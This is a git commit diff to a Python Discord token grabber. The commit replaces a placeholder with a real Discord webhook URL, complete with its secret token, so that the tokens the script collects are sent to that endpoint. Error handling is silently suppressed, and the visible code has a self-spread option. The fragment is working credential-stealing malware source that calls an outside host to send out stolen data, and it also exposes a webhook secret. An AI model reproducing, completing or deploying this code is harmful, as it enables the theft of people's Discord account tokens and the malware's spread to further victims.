d2783e5cdb52f2e0ef3c2f3e905e6884ae06d091
Nathanx280 <51236868+Nathanx280@users.noreply.github.com>
2022-10-05 15:01:01 +1100

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -182,7 +182,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("WEBHOOK_URL", data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://discord.com/api/webhooks/1027065735324905503/xIXnAq4c6-ZPkBOAfEDNihrFz4ugT0bg2zHBh3r_RGxcb_yOJkJt2xXhZp1C8XpDONsA", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
